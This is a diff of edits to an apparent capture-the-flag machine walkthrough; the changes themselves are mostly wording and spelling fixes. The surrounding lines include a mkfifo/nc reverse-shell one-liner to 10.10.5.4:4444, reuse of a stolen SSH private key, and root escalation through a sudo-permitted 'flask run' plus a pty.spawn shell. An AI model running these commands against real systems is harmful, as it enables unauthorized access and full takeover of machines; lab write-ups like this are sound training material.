@@ -22,8 +22,8 @@ import System.Cmd
 main = system "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.5.4 4444 >/tmp/f"
 ```
 
-5. In the /home/prof directory was a .ssh with a readably id_rsa. I extracted this to ssh in as prof.
-6. Prof had  `(root) NOPASSWD: /usr/bin/flask run`. After a bit of trial and error around how this command worked, I got a root reverse shell via:
+5. In the `/home/prof` directory was a `.ssh` folder with a readable `id_rsa`. I extracted this to my host machine in order to ssh in as prof.
+6. Via `sudo -l`, prof had  `(root) NOPASSWD: /usr/bin/flask run`. After a bit of trial and error around how this command worked, I got a root reverse shell via:
 
     a. creating a file called shell.py with the following contents:
 
@@ -38,4 +38,4 @@ main = system "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.5.4 4
 
 Easy, but interesting!
 
-**BONUS:** for step six, rather than catching a root reverse shell, changing shell.py to contain `import pty; pty.spawn('/bin/bash')` works as well, spawing an instant root shell.
+**BONUS:** for step six, rather than catching a root reverse shell, changing shell.py to contain `import pty; pty.spawn('/bin/bash')` works too, spawning an instant root shell.
